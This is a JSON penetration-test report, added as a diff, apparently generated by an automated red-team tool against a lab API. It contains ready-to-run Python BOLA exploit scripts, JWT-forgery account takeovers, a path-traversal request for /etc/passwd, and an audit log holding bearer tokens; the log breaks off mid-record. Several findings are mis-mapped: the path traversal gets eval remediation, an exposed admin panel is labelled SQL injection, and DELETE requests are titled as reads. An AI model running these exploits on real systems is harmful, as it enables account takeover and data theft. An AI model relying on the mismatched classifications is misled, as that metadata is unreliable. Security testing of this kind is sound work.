@@ -1,0 +1,2045 @@
+{
+  "schema": "valen.report/1",
+  "engagement": {
+    "client": "",
+    "scope": "",
+    "author": "",
+    "date_start": "",
+    "date_end": "",
+    "roe": "",
+    "limitations": ""
+  },
+  "summary": {
+    "findings": 10,
+    "critical_high": 4,
+    "max_cvss": 9.8,
+    "mean_cvss": 7.62
+  },
+  "findings": [
+    {
+      "title": "JWT forgery -> account takeover (kid_path_traversal)",
+      "category": "account_takeover",
+      "severity": "Critical",
+      "cvss": 9.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "repro": "forge JWT via kid_path_traversal, call /identity/api/v2/user/dashboard",
+      "evidence": "{\"id\":532,\"name\":\"Victim\",\"email\":\"victim-ac2cfa51@example.com\",\"number\":\"9421688809\",\"picture_url\":null,\"video_url\":null,\"video_name\":null,\"available_credit\":100.0,\"video_id\":0,\"role\":\"ROLE_USER\"}",
+      "cwe": [
+        "CWE-287",
+        "CWE-347"
+      ],
+      "owasp": "A07:2021 – Identification and Authentication Failures",
+      "mitre_tactic": "TA0006",
+      "remediation": "Pin the signature algorithm, verify signatures on every token, and reject alg=none / key-confusion."
+    },
+    {
+      "title": "JWT forgery -> account takeover (invalid_signature)",
+      "category": "account_takeover",
+      "severity": "Critical",
+      "cvss": 9.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "repro": "forge JWT via invalid_signature, call /identity/api/v2/user/dashboard",
+      "evidence": "{\"id\":532,\"name\":\"Victim\",\"email\":\"victim-ac2cfa51@example.com\",\"number\":\"9421688809\",\"picture_url\":null,\"video_url\":null,\"video_name\":null,\"available_credit\":100.0,\"video_id\":0,\"role\":\"ROLE_USER\"}",
+      "cwe": [
+        "CWE-287",
+        "CWE-347"
+      ],
+      "owasp": "A07:2021 – Identification and Authentication Failures",
+      "mitre_tactic": "TA0006",
+      "remediation": "Pin the signature algorithm, verify signatures on every token, and reject alg=none / key-confusion."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/1",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/1",
+      "evidence": "{\"order\":{\"id\":1,\"user\":{\"email\":\"adam007@example.com\",\"number\":\"9876895423\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transact",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/2",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/2",
+      "evidence": "{\"order\":{\"id\":2,\"user\":{\"email\":\"pogba006@example.com\",\"number\":\"9876570006\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transac",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/3",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/3",
+      "evidence": "{\"order\":{\"id\":3,\"user\":{\"email\":\"robot001@example.com\",\"number\":\"9876570001\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transac",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/4",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/4",
+      "evidence": "{\"order\":{\"id\":4,\"user\":{\"email\":\"test@example.com\",\"number\":\"9876540001\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transaction",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/5",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/5",
+      "evidence": "{\"order\":{\"id\":5,\"user\":{\"email\":\"admin@example.com\",\"number\":\"9010203040\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transactio",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "BOLA/IDOR: cross-user access to /workshop/api/shop/orders/6",
+      "category": "idor",
+      "severity": "Medium",
+      "cvss": 6.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "repro": "attacker token -> GET /workshop/api/shop/orders/6",
+      "evidence": "{\"order\":{\"id\":6,\"user\":{\"email\":\"attacker-0826f593@example.com\",\"number\":\"9840174543\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":-1,\"status\":\"delivered",
+      "cwe": [
+        "CWE-639"
+      ],
+      "owasp": "A01:2021 – Broken Access Control",
+      "mitre_tactic": "TA0009",
+      "remediation": "Enforce object-level authorization (ownership) on every resource identifier, server-side."
+    },
+    {
+      "title": "HIGH · Apache 2.4.49 Path Traversal",
+      "category": "code_execution",
+      "severity": "High",
+      "cvss": 8.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "repro": "template CVE-2021-41773 matched at http://10.0.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd (host 10.0.0.5)",
+      "evidence": "template CVE-2021-41773 matched at http://10.0.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd (host 10.0.0.5)",
+      "cwe": [
+        "CWE-94",
+        "CWE-95"
+      ],
+      "owasp": "A03:2021 – Injection",
+      "mitre_tactic": "TA0002",
+      "remediation": "Never eval/exec dynamic content. Replace with safe interpreters (ast.literal_eval, JSON, safe templates)."
+    },
+    {
+      "title": "MEDIUM · Exposed Admin Panel",
+      "category": "sql",
+      "severity": "High",
+      "cvss": 8.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "repro": "template exposed-panel matched at http://10.0.0.10/admin (host 10.0.0.10)",
+      "evidence": "template exposed-panel matched at http://10.0.0.10/admin (host 10.0.0.10)",
+      "cwe": [
+        "CWE-89"
+      ],
+      "owasp": "A03:2021 – Injection",
+      "mitre_tactic": "TA0006",
+      "remediation": "Use parameterized queries / prepared statements; never concatenate untrusted input into SQL."
+    }
+  ],
+  "plan_steps": [
+    {
+      "phase": "Discovery",
+      "tactic_id": "TA0007",
+      "tactic": "Discovery",
+      "title": "Map the network (3 hosts, gateway 10.0.0.1)",
+      "detail": "pivot/route bridges: gw<->web, gw<->ftp, gw<->ssh OpenSSH 7.2, web<->http Apache httpd 2.4.49"
+    },
+    {
+      "phase": "Discovery",
+      "tactic_id": "TA0007",
+      "tactic": "Discovery",
+      "title": "Map the trust topology (IAM)",
+      "detail": "Fiedler boundary: ['secrets-bucket', 'admin-role', 'public-api', 'db-role', 'frontend-role']; privilege bridges: frontend-role->db-role, public-api->frontend-role, frontend-role->admin-role"
+    },
+    {
+      "phase": "Discovery",
+      "tactic_id": "TA0007",
+      "tactic": "Lateral Movement",
+      "title": "INFO · Missing Security Headers",
+      "detail": "template http-missing-security-headers matched at http://192.168.1.1/ (host 192.168.1.1)"
+    },
+    {
+      "phase": "Discovery",
+      "tactic_id": "TA0007",
+      "tactic": "Lateral Movement",
+      "title": "INFO · Technology Detection",
+      "detail": "template tech-detect matched at http://192.168.1.8:3000/ (host 192.168.1.8)"
+    },
+    {
+      "phase": "Execution",
+      "tactic_id": "TA0002",
+      "tactic": "Execution",
+      "title": "HIGH · Apache 2.4.49 Path Traversal",
+      "detail": "template CVE-2021-41773 matched at http://10.0.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd (host 10.0.0.5)"
+    },
+    {
+      "phase": "Privilege Escalation",
+      "tactic_id": "TA0004",
+      "tactic": "Privilege Escalation",
+      "title": "Escalate public-api -> secrets-bucket",
+      "chain": [
+        "public-api -[assume]-> frontend-role",
+        "frontend-role -[assume]-> db-role",
+        "db-role -[access]-> secrets-bucket"
+      ],
+      "z3_reachable": true,
+      "z3_witness": [
+        "admin-role",
+        "db-role",
+        "frontend-role",
+        "public-api",
+        "secrets-bucket"
+      ]
+    },
+    {
+      "phase": "Privilege Escalation",
+      "tactic_id": "TA0004",
+      "tactic": "Privilege Escalation",
+      "title": "Escalate public-api -> admin-role",
+      "chain": [
+        "public-api -[assume]-> frontend-role",
+        "frontend-role -[assume]-> admin-role"
+      ],
+      "z3_reachable": true,
+      "z3_witness": [
+        "admin-role",
+        "db-role",
+        "frontend-role",
+        "public-api",
+        "secrets-bucket"
+      ]
+    },
+    {
+      "phase": "Credential Access",
+      "tactic_id": "TA0006",
+      "tactic": "Credential Access",
+      "title": "MEDIUM · Exposed Admin Panel",
+      "detail": "template exposed-panel matched at http://10.0.0.10/admin (host 10.0.0.10)"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via GET /identity/api/v2/user/videos/{video_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via PUT /identity/api/v2/user/videos/{video_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.put(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via DELETE /identity/api/v2/user/videos/{video_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.delete(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via DELETE /identity/api/v2/admin/videos/{video_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/admin/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.delete(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via GET /identity/api/v2/vehicle/{vehicleId}/location",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/vehicle/{VICTIM_ID}/location'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via PUT /workshop/api/shop/orders/{order_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.put(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via GET /workshop/api/shop/orders/{order_id}",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via POST /workshop/api/shop/orders/return_order",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/return_order'.format(VICTIM_ID=VICTIM_ID)\nr = requests.post(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "phase": "Collection",
+      "tactic_id": "TA0009",
+      "tactic": "Collection",
+      "title": "Read victim resource via GET /workshop/api/mechanic/mechanic_report",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/mechanic/mechanic_report'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    }
+  ],
+  "pocs": [
+    {
+      "method": "GET",
+      "path": "/identity/api/v2/user/videos/{video_id}",
+      "id_params": [
+        "video_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "PUT",
+      "path": "/identity/api/v2/user/videos/{video_id}",
+      "id_params": [
+        "video_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.put(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "DELETE",
+      "path": "/identity/api/v2/user/videos/{video_id}",
+      "id_params": [
+        "video_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/user/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.delete(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "DELETE",
+      "path": "/identity/api/v2/admin/videos/{video_id}",
+      "id_params": [
+        "video_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/admin/videos/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.delete(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "GET",
+      "path": "/identity/api/v2/vehicle/{vehicleId}/location",
+      "id_params": [],
+      "leak_hint": "full_name",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/identity/api/v2/vehicle/{VICTIM_ID}/location'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nassert 'full_name' in r.text, \"expected leaked data 'full_name' not in response\"\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "PUT",
+      "path": "/workshop/api/shop/orders/{order_id}",
+      "id_params": [
+        "order_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.put(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "GET",
+      "path": "/workshop/api/shop/orders/{order_id}",
+      "id_params": [
+        "order_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/{VICTIM_ID}'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "POST",
+      "path": "/workshop/api/shop/orders/return_order",
+      "id_params": [
+        "order_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/shop/orders/return_order'.format(VICTIM_ID=VICTIM_ID)\nr = requests.post(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    },
+    {
+      "method": "GET",
+      "path": "/workshop/api/mechanic/mechanic_report",
+      "id_params": [
+        "report_id"
+      ],
+      "leak_hint": "",
+      "poc": "# BOLA/IDOR proof-of-concept (generated by VALEN red-team assistant)\nimport requests\n\nBASE = 'http://localhost:8888'\nTOKEN = \"<attacker bearer token>\"\nVICTIM_ID = \"<victim object id>\"\n\nurl = BASE + '/workshop/api/mechanic/mechanic_report'.format(VICTIM_ID=VICTIM_ID)\nr = requests.get(url, headers={\"Authorization\": \"Bearer \" + TOKEN})\nprint(\"status:\", r.status_code)\nprint(r.text[:500])\nassert r.status_code == 200, \"endpoint did not return the resource (status={})\".format(r.status_code)\nprint(\"BOLA confirmed: attacker reached the victim's resource\")\n"
+    }
+  ],
+  "pentest": {
+    "solved": 16,
+    "n": 18,
+    "results": [
+      {
+        "challenge": "ch1_bola_vehicle",
+        "solved": true,
+        "requests": 7,
+        "seconds": 0.68,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-dd83e08f@example.com",
+              "number": "9775540010"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-dd83e08f@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGQ4M2UwOGZAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDMsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-56709a94@example.com",
+              "number": "9594549809"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-56709a94@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci01NjcwOWE5NEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/identity/api/v2/vehicle/add_vehicle",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGQ4M2UwOGZAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDMsImV4cCI6MTc5MDgxNjkwMywicm9sZSI6InVzZXIifQ.mplwI5kRDhLKa_51xJpORZ2qNnXaXSCPM8J3X6M-9a_nzW2CTshkO0ODqLHp9Ic8WWQaCH6cz3_Vl1Mf4xx1_cp50Qj6Vu_7FOdX71EDLbG0gzugiYkOFvnEJpVh0sG9EomPwWbV342bh7q7_YWXcyhGjPbkXIaH2g6j7IGeInXS5l476wSyqwKxiy-RMWgRSD8V0yvD96zYA-6mrsYpuEwhSRuiqHLYSE2TrwV1xuUzrWWG0bKEOeDdl-RR628tQv9iw1ZPbobEDSNMaSaLfbrPjEjRvDTK7jJeyp7EG-K3YssBsG48BC7fz09OxDS-bL4n32gp3baM5qbg_vNX1w",
+              "body": {
+                "vin": "680W97Z5E3NBL9TXL",
+                "pincode": "1695"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"Vehicle save successfully..\",\"status\":200}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/identity/api/v2/vehicle/vehicles",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGQ4M2UwOGZAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDMsImV4cCI6MTc5MDgxNjkwMywicm9sZSI6InVzZXIifQ.mplwI5kRDhLKa_51xJpORZ2qNnXaXSCPM8J3X6M-9a_nzW2CTshkO0ODqLHp9Ic8WWQaCH6cz3_Vl1Mf4xx1_cp50Qj6Vu_7FOdX71EDLbG0gzugiYkOFvnEJpVh0sG9EomPwWbV342bh7q7_YWXcyhGjPbkXIaH2g6j7IGeInXS5l476wSyqwKxiy-RMWgRSD8V0yvD96zYA-6mrsYpuEwhSRuiqHLYSE2TrwV1xuUzrWWG0bKEOeDdl-RR628tQv9iw1ZPbobEDSNMaSaLfbrPjEjRvDTK7jJeyp7EG-K3YssBsG48BC7fz09OxDS-bL4n32gp3baM5qbg_vNX1w"
+            },
+            "status": 200,
+            "snippet": "[{\"id\":503,\"uuid\":\"7687261a-6e19-4bba-bec5-2f507036d7eb\",\"pincode\":\"1695\",\"vin\":\"680W97Z5E3NBL9TXL\",\"year\":2026,\"status\""
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/identity/api/v2/vehicle/7687261a-6e19-4bba-bec5-2f507036d7eb/location",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci01NjcwOWE5NEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNCwiZXhwIjoxNzkwODE2OTA0LCJyb2xlIjoidXNlciJ9.OQ9OnBAU6rrhLv6lVVxLEPH-fgFAKuMCzb7QoQmk9XrN7rwaLjxYdAmgmyX2W-MYryTQNceTEoxJPt7X3XdWWrgW7zJQvZU2MzXWuQ06jlUxTSixERS_TpwdU5xU9kMj01_k4gxMpn0AlJiIqpPQPlw-88MtQSPm87lo3BTsELrjp-lMJ4Fwj8A21fkzHqpimRFhPWJFZbA3_wMCsQHZqaz1n-FT3ukzH6DjWW4WGhgS_hXRWIsxo0iS2O5YPr4B8pSqVibTMv14isXjyOkO2g9rpA8OEDiJQFNJpYbEvkFRkDPCZnM6XzzEY82YLTJYrtpAjrRqX75Ti8RKumDWyw"
+            },
+            "status": 200,
